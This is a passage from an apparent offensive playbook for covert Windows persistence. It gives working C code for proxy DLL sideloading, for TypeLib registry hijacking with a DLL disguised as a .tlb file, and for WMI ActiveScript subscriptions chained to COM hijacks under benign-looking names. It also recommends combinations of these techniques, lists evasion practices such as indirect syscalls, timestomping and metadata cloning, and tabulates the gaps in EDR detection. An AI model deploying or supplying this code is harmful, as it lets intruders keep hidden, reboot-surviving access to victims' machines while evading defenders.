        GetSystemDirectoryW(wszReal, MAX_PATH);
        wcscat_s(wszReal, MAX_PATH, L"\\dbghelp.dll"); // Change per target
        LoadLibraryW(wszReal);

        // One-shot mutex
        HANDLE hM = CreateMutexA(NULL, TRUE, "Global\\{proxy-dbghelp-mtx}");
        if (hM && GetLastError() != ERROR_ALREADY_EXISTS) {
            CreateThread(NULL, 0, Payload, NULL, 0, NULL);
        }
        if (hM) CloseHandle(hM);
    }
    return TRUE;
}
```

### Export Generator Script

```python
# export_generator.py — Generate #pragma comment(linker, ...) lines from a DLL
# Usage: python export_generator.py <path_to_dll> <forwarding_name>
# Example: python export_generator.py C:\Windows\System32\version.dll version_orig

import pefile
import sys

def generate_forwards(dll_path, forward_name):
    pe = pefile.PE(dll_path)
    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print("No exports found")
        return

    print(f"// Auto-generated export forwards for {dll_path}")
    print(f"// Forward target: {forward_name}")
    print()

    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name:
            name = exp.name.decode('utf-8')
            print(f'#pragma comment(linker, "/export:{name}={forward_name}.{name}")')
        elif exp.ordinal:
            print(f'#pragma comment(linker, "/export:Ordinal{exp.ordinal}={forward_name}.#{exp.ordinal},@{exp.ordinal},NONAME")')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <dll_path> <forward_name>")
        sys.exit(1)
    generate_forwards(sys.argv[1], sys.argv[2])
```

---

## 5. TypeLib Hijacking

> OPSEC: Low
> Admin Required: No (HKCU writes)
> Sysmon: Event ID 13 (Registry Value Set) on HKCU\Software\Classes\TypeLib — very rarely monitored
> ETW: Microsoft-Windows-Kernel-Registry (HKCU write)
> EDR Detection: Almost no EDR monitors TypeLib registry paths; not in standard persistence checklists
> Advantage: Less known than InprocServer32 hijacking; triggered by COM automation clients; HKCU overrides HKLM
> Trigger: Application loads a type library (Office macros, scripting hosts, automation tools)
> Source: N/A (novel persistence vector, documented 2024+)

### Concept

COM type libraries (.tlb files) are registered under `HKLM\Software\Classes\TypeLib\{GUID}\version\0\win64`. When a COM client calls `LoadTypeLib` or `LoadRegTypeLib`, Windows checks HKCU first. By writing a HKCU TypeLib entry pointing to a malicious DLL (disguised as .tlb), the DLL is loaded when any automation client references that type library.

Key advantage: TypeLib paths are almost never audited by EDR. Most persistence scanners check InprocServer32 but skip TypeLib entries entirely.

### High-Value TypeLib Targets

| TypeLib GUID | Name | Loaded By |
|-------------|------|-----------|
| `{00020813-0000-0000-C000-000000000046}` | Microsoft Excel Object Library | Excel, Office automation |
| `{00020905-0000-0000-C000-000000000046}` | Microsoft Word Object Library | Word, Office automation |
| `{F5078F18-C551-11D3-89B9-0000F81FE221}` | MSXML2 | Many apps using XML parsing |
| `{565783C6-CB41-11D1-8B02-00600806D9B6}` | Windows Script Host | wscript.exe, cscript.exe |

### Implementation

```c
// typelib_hijack.c — TypeLib registry hijacking for persistence
// No admin required — writes to HKCU

#include <windows.h>
#include <stdio.h>

// Target: MSXML2 TypeLib — loaded by many applications
#define TARGET_TYPELIB_GUID L"{F5078F18-C551-11D3-89B9-0000F81FE221}"
#define TARGET_VERSION      L"6.0"

BOOL TypeLibHijack(LPCWSTR pwszDllPath) {
    HKEY hKey = NULL;
    WCHAR wszKeyPath[512];

    // HKCU\Software\Classes\TypeLib\{GUID}\version\0\win64
    swprintf_s(wszKeyPath, 512,
        L"Software\\Classes\\TypeLib\\%s\\%s\\0\\win64",
        TARGET_TYPELIB_GUID, TARGET_VERSION);

    LSTATUS status = RegCreateKeyExW(
        HKEY_CURRENT_USER, wszKeyPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);

    if (status != ERROR_SUCCESS) return FALSE;

    // Set default value to our DLL path (disguised as .tlb)
    DWORD cbData = (DWORD)((wcslen(pwszDllPath) + 1) * sizeof(WCHAR));
    status = RegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE*)pwszDllPath, cbData);
    RegCloseKey(hKey);

    // Also set the FLAGS and HELPDIR for completeness
    swprintf_s(wszKeyPath, 512,
        L"Software\\Classes\\TypeLib\\%s\\%s\\FLAGS",
        TARGET_TYPELIB_GUID, TARGET_VERSION);
    RegCreateKeyExW(HKEY_CURRENT_USER, wszKeyPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (hKey) {
        RegSetValueExW(hKey, L"", 0, REG_SZ, (const BYTE*)L"0", 4);
        RegCloseKey(hKey);
    }

    return (status == ERROR_SUCCESS);
}

// The DLL at pwszDllPath should:
// 1. Export DllGetTypeInfo or implement ITypeLib interface minimally
// 2. Execute payload on load
// 3. Optionally forward to real .tlb for transparency

// Usage:
// TypeLibHijack(L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\msxml6.tlb");
// (The .tlb file is actually a DLL with .tlb extension)
```

### TypeLib Proxy DLL

```c
// typelib_proxy.c — DLL disguised as .tlb that executes payload
// Rename output to .tlb extension after compilation
// Compile: cl /LD typelib_proxy.c /link /OUT:msxml6.dll
// Then: rename msxml6.dll msxml6.tlb

#include <windows.h>
#include <oaidl.h>

static DWORD WINAPI TlbPayload(LPVOID p) {
    UNREFERENCED_PARAMETER(p);
    // Payload logic here
    return 0;
}

// Minimal ITypeLib implementation to prevent crashes
// Most callers just need LoadTypeLib to succeed

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE hM = CreateMutexA(NULL, TRUE, "Global\\{tlb-persist-mtx}");
        if (hM && GetLastError() != ERROR_ALREADY_EXISTS) {
            CreateThread(NULL, 0, TlbPayload, NULL, 0, NULL);
        }
        if (hM) CloseHandle(hM);
    }
    return TRUE;
}

// Export that LoadTypeLib may call
__declspec(dllexport) HRESULT WINAPI DllGetTypeLib(void** ppTLib) {
    if (ppTLib) *ppTLib = NULL;
    return E_NOTIMPL; // Graceful failure — caller handles it
}
```

### Cleanup

```c
// Remove TypeLib hijack
BOOL TypeLibCleanup(void) {
    WCHAR wszKeyPath[512];
    swprintf_s(wszKeyPath, 512,
        L"Software\\Classes\\TypeLib\\%s",
        TARGET_TYPELIB_GUID);
    // Delete entire HKCU TypeLib entry (HKLM original remains)
    return (RegDeleteTreeW(HKEY_CURRENT_USER, wszKeyPath) == ERROR_SUCCESS);
}
```

---

## 6. WMI Event Subscription (Stealth via COM Indirection)

> OPSEC: Low (when using ActiveScriptEventConsumer + COM indirection)
> Admin Required: Yes
> Sysmon: Event ID 19/20/21 — but ActiveScript consumers are less flagged than CommandLine consumers
> ETW: Microsoft-Windows-WMI-Activity (subscription creation)
> EDR Detection: Most EDR alert on CommandLineEventConsumer; ActiveScriptEventConsumer with COM instantiation is less monitored
> Advantage: Fileless execution; survives reboots; no binary on disk if payload is in registry/WMI store
> Trigger: Configurable (boot, logon, process start, time interval)
> Source: N/A (technique refinement for stealth)

### Concept

Standard WMI persistence uses `CommandLineEventConsumer` which is heavily monitored. The stealth variant uses `ActiveScriptEventConsumer` with a VBScript/JScript that instantiates a COM object — which itself is hijacked (see Section 1). This creates an indirection layer: WMI triggers script → script loads COM → COM loads your DLL.

The WMI subscription itself looks benign (no binary path visible), and the actual payload delivery is via COM hijacking.

### Implementation — Stealth WMI + COM Chain

```c
// wmi_stealth.c — Create WMI event subscription with ActiveScript consumer
// The script instantiates a hijacked COM object, triggering DLL load
//
// Prerequisites: COM hijack already installed (Section 1)

#include <windows.h>
#include <wbemidl.h>
#include <oleauto.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// Helper: set string property on WMI object
static HRESULT SetWbemString(IWbemClassObject* pObj, LPCWSTR prop, LPCWSTR val) {
    VARIANT v;
    VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(val);
    HRESULT hr = pObj->lpVtbl->Put(pObj, prop, 0, &v, 0);
    VariantClear(&v);
    return hr;
}

BOOL CreateStealthWmiPersistence(
    LPCWSTR pwszFilterName,
    LPCWSTR pwszConsumerName,
    LPCWSTR pwszWqlQuery,
    LPCWSTR pwszHijackedClsid  // CLSID that is COM-hijacked (Section 1)
) {
    HRESULT hr;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) return FALSE;

    BSTR bstrNamespace = SysAllocString(L"ROOT\\subscription");
    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrNamespace, NULL, NULL, NULL,
                                      0, NULL, NULL, &pSvc);
    SysFreeString(bstrNamespace);
    if (FAILED(hr)) { pLoc->lpVtbl->Release(pLoc); return FALSE; }

    // Set security
    CoSetProxyBlanket((IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                      NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                      NULL, EOAC_NONE);

    // --- 1. Create __EventFilter ---
    IWbemClassObject* pFilterClass = NULL;
    IWbemClassObject* pFilter = NULL;
    BSTR bstrFilter = SysAllocString(L"__EventFilter");
    pSvc->lpVtbl->GetObject(pSvc, bstrFilter, 0, NULL, &pFilterClass, NULL);
    SysFreeString(bstrFilter);
    pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pFilter);

    SetWbemString(pFilter, L"Name", pwszFilterName);
    SetWbemString(pFilter, L"QueryLanguage", L"WQL");
    SetWbemString(pFilter, L"Query", pwszWqlQuery);
    SetWbemString(pFilter, L"EventNamespace", L"root\\cimv2");

    pSvc->lpVtbl->PutInstance(pSvc, pFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // --- 2. Create ActiveScriptEventConsumer ---
    // Script instantiates the hijacked COM object — this triggers DLL load
    WCHAR wszScript[1024];
    swprintf_s(wszScript, 1024,
        L"Set obj = CreateObject(\"new:{%s}\")\n",  // COM moniker syntax
        pwszHijackedClsid);

    IWbemClassObject* pConsumerClass = NULL;
    IWbemClassObject* pConsumer = NULL;
    BSTR bstrConsumer = SysAllocString(L"ActiveScriptEventConsumer");
    pSvc->lpVtbl->GetObject(pSvc, bstrConsumer, 0, NULL, &pConsumerClass, NULL);
    SysFreeString(bstrConsumer);
    pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pConsumer);

    SetWbemString(pConsumer, L"Name", pwszConsumerName);
    SetWbemString(pConsumer, L"ScriptingEngine", L"VBScript");
    SetWbemString(pConsumer, L"ScriptText", wszScript);

    pSvc->lpVtbl->PutInstance(pSvc, pConsumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // --- 3. Create __FilterToConsumerBinding ---
    IWbemClassObject* pBindingClass = NULL;
    IWbemClassObject* pBinding = NULL;
    BSTR bstrBinding = SysAllocString(L"__FilterToConsumerBinding");
    pSvc->lpVtbl->GetObject(pSvc, bstrBinding, 0, NULL, &pBindingClass, NULL);
    SysFreeString(bstrBinding);
    pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pBinding);

    WCHAR wszFilterRef[512], wszConsumerRef[512];
    swprintf_s(wszFilterRef, 512,
        L"__EventFilter.Name=\"%s\"", pwszFilterName);
    swprintf_s(wszConsumerRef, 512,
        L"ActiveScriptEventConsumer.Name=\"%s\"", pwszConsumerName);

    SetWbemString(pBinding, L"Filter", wszFilterRef);
    SetWbemString(pBinding, L"Consumer", wszConsumerRef);

    pSvc->lpVtbl->PutInstance(pSvc, pBinding, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    // Cleanup COM objects
    pBinding->lpVtbl->Release(pBinding);
    pBindingClass->lpVtbl->Release(pBindingClass);
    pConsumer->lpVtbl->Release(pConsumer);
    pConsumerClass->lpVtbl->Release(pConsumerClass);
    pFilter->lpVtbl->Release(pFilter);
    pFilterClass->lpVtbl->Release(pFilterClass);
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);

    return TRUE;
}

// Usage — trigger on user logon, load hijacked COM:
// CreateStealthWmiPersistence(
//     L"SystemHealthFilter",           // Benign-looking name
//     L"SystemHealthConsumer",
//     L"SELECT * FROM __InstanceCreationEvent WITHIN 10 "
//     L"WHERE TargetInstance ISA 'Win32_LogonSession' "
//     L"AND TargetInstance.LogonType = 2",
//     L"BCDE0395-E52F-467C-8E3D-C4579291692E"  // Hijacked MMDeviceEnumerator
// );
```

### WMI Cleanup

```c
BOOL RemoveWmiPersistence(LPCWSTR pwszFilterName, LPCWSTR pwszConsumerName) {
    // Connect to ROOT\subscription namespace
    // Delete binding, consumer, and filter in reverse order
    IWbemServices* pSvc = NULL; // ... (connect as above)

    WCHAR wszQuery[512];

    // Delete binding
    swprintf_s(wszQuery, 512,
        L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"%s\\\"\","
        L"Consumer=\"ActiveScriptEventConsumer.Name=\\\"%s\\\"\"",
        pwszFilterName, pwszConsumerName);
    BSTR bstrPath = SysAllocString(wszQuery);
    pSvc->lpVtbl->DeleteInstance(pSvc, bstrPath, 0, NULL, NULL);
    SysFreeString(bstrPath);

    // Delete consumer
    swprintf_s(wszQuery, 512, L"ActiveScriptEventConsumer.Name=\"%s\"", pwszConsumerName);
    bstrPath = SysAllocString(wszQuery);
    pSvc->lpVtbl->DeleteInstance(pSvc, bstrPath, 0, NULL, NULL);
    SysFreeString(bstrPath);

    // Delete filter
    swprintf_s(wszQuery, 512, L"__EventFilter.Name=\"%s\"", pwszFilterName);
    bstrPath = SysAllocString(wszQuery);
    pSvc->lpVtbl->DeleteInstance(pSvc, bstrPath, 0, NULL, NULL);
    SysFreeString(bstrPath);

    return TRUE;
}
```

---

## 7. Practical Recommendations

### Tier 1 — No Admin Required

| Technique | Trigger | Best For |
|-----------|---------|----------|
| COM Hijacking (HKCU) | Any CoCreateInstance of target CLSID | Immediate persistence after initial access |
| DLL Sideloading (user apps) | OneDrive/Teams/Slack/Discord launch | Auto-start persistence via user apps |
| TypeLib Hijacking | COM automation client loads type library | Stealthy secondary persistence |

**Recommended combo:** COM Hijack (MMDeviceEnumerator) + DLL Sideload (OneDrive version.dll) = two independent persistence mechanisms, both user-level, no admin.

### Tier 2 — Admin Required (One-Time)

| Technique | Trigger | Best For |
|-----------|---------|----------|
| Phantom DLL (cscapi.dll) | Every Explorer.exe startup | Extremely stealthy long-term persistence |
| DLL Search Order (Program Files) | Target app launch | Persistence in enterprise apps |
| WMI + COM Chain | Configurable (logon, boot, process) | Redundant persistence with indirection |

**Recommended combo:** Phantom DLL (cscapi.dll) + WMI→COM chain = two independent mechanisms, both survive reimaging of user profile.

### Payload DLL Best Practices

All proxy/phantom DLLs should use:

1. **Indirect syscalls** — Resolve ntdll functions via PEB walk + hash, not GetProcAddress
2. **No suspicious imports** — IAT should only show kernel32 basics (LoadLibrary, GetProcAddress at most)
3. **Mutex deduplication** — Prevent multiple payload executions across processes
4. **Process filtering** — Only execute in expected host process (check GetModuleFileName)
5. **Timestomping** — Match DLL timestamps to surrounding legitimate files
6. **Metadata cloning** — Copy version info resource from legitimate DLL
7. **Signed parent** — Ensure host process is Microsoft-signed for EDR trust

### Detection Gaps (Why These Work)

| What EDR Monitors | What EDR Misses |
|-------------------|-----------------|
| Registry Run/RunOnce keys | HKCU\Software\Classes\CLSID writes |
| Scheduled Task creation | TypeLib registry entries |
| Service installation | DLL loads from application directories |
| CommandLineEventConsumer | ActiveScriptEventConsumer + COM chain |
| Known persistence paths | Phantom DLLs (files that "should" exist) |
| Unsigned DLL in System32 | Proxy DLL forwarding all exports correctly |

---

## Summary Table

| # | Technique | Admin | Registry | Trigger | Survives Reboot |
|---|-----------|-------|----------|---------|-----------------|
| 1 | COM Hijacking (HKCU) | No | HKCU CLSID | COM instantiation | Yes |
| 2 | DLL Sideloading | No* | None | App launch | Yes |
| 3 | Phantom DLL (cscapi.dll) | Yes | None | Explorer startup | Yes |
| 4 | DLL Search Order Hijack | Varies | None | App launch | Yes |
| 5 | TypeLib Hijacking | No | HKCU TypeLib | COM automation | Yes |
| 6 | WMI + COM Chain | Yes | None (WMI store) | Configurable | Yes |

*No admin for user-installed apps (AppData); admin for Program Files apps.



